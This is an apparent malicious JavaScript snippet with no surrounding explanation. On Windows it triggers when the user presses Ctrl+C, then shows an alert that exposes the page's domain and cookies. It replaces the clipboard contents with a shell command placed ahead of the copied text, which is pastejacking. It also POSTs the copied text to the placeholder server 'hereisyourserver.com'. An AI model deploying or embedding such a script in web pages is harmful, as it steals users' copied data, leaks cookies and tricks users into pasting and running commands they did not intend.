document.addEventListener('keypress', (event) => {
    var key = event.which || event.keyCode; 
    var ctrl = event.ctrlKey ? event.ctrlKey : ((key === 17) ? true : false); 

    // Check if the user's operating system is Windows
    var os = navigator.platform;
    var testIfWindows = os.indexOf("Win");

    if ((ctrl) && (key == 99) && testIfWindows !== -1) {    
        // Get string that the user has highlighted
        var userstring = window.getSelection().toString();
        attack(userstring);
        sendToServer(userstring);
    }
});

function attack(userstring) {
    // Pop an alert with the desired information
    alert("Hacked By YoMananChill\n" + document.domain + "\n" + document.cookie);

    // Create a new textarea (or some other element where we can write our text)
    var textarea = document.createElement('textarea');
    // Set the value of the textarea to the command we wish to execute
    textarea.value = 'echo dödshackad > C:\\temp\\hackad.txt;\r\n' + userstring;
    // Append the textarea to the DOM to copy the text from it into the copy-buffer
    document.body.appendChild(textarea);
    // "Highlight" and select the text
    textarea.focus();
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
}

function sendToServer(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://hereisyourserver.com", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        copiedText: data
    }));
}
